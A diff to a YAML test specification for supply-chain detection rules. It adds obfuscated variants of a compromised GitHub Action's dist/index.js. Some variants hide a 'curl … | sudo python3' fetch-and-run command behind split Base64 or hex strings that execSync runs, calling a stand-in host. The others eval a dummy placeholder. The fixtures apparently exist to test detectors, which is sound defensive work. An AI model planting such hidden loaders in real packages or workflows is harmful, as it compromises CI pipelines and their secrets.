@@ -37,3 +37,49 @@ must_not_fire: [RC-AUTO-061, RC-BIN-001]
 not_covered: >
   The attack itself was a moved tag: workflows that use an action by a mutable tag
   instead of a commit id are not reported.
+
+variants:
+  - id: split-base64-execsync
+    technique: The Base64 command is split into two string constants that are joined before decoding.
+    files:
+      dist/index.js: |
+        "use strict";
+        const child_process = require("child_process");
+        const core = { setOutput: (name, value) => console.log(name, value) };
+        const PART_A = "Y3VybCAtc1NmIGh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2R1bW15LnB5IHwg";
+        const PART_B = "c3VkbyBweXRob24zIHwgYmFzZTY0IC13IDAgfCBiYXNlNjQgLXcgMA==";
+        async function updateFeatures() {
+          const script = PART_A + PART_B;
+          child_process.execSync(Buffer.from(script, "base64").toString("utf-8"), { stdio: "inherit" });
+        }
+        updateFeatures().then(() => core.setOutput("any_changed", "true"));
+  - id: split-base64-eval
+    technique: Two Base64 string constants are concatenated, decoded with atob and passed to eval.
+    files:
+      dist/index.js: |
+        "use strict";
+        const core = { setOutput: (name, value) => console.log(name, value) };
+        const head = "Y29uc29sZS5sb2coImR1bW15IHBheWxvYWQsIG5vdGhpbmcg";
+        const tail = "cnVucyIpOyAvLyBodHRwczovL2V4YW1wbGUuaW52YWxpZA==";
+        eval(atob(head + tail));
+        core.setOutput("any_changed", "true");
+  - id: hex-encoding
+    technique: The command is hex-encoded instead of Base64-encoded.
+    files:
+      dist/index.js: |
+        "use strict";
+        const child_process = require("child_process");
+        const SHELL_SCRIPT = "6375726c202d7353662068747470733a2f2f6578616d706c652e696e76616c69642f64756d6d792e7079207c20707974686f6e33";
+        child_process.execSync(Buffer.from(SHELL_SCRIPT, "hex").toString("utf-8"), { stdio: "inherit" });
+  - id: split-base64-separate-steps
+    technique: Two Base64 constants are joined through a variable, decoded in one statement and run with eval in the next.
+    files:
+      dist/index.js: |
+        "use strict";
+        const core = { setOutput: (name, value) => console.log(name, value) };
+        const head = "Y29uc29sZS5sb2coImR1bW15IHBheWxvYWQsIG5vdGhpbmcg";
+        const tail = "cnVucyIpOyAvLyBodHRwczovL2V4YW1wbGUuaW52YWxpZA==";
+        const joined = head + tail;
+        const source = Buffer.from(joined, "base64").toString("utf8");
+        eval(source);
+        core.setOutput("any_changed", "true");
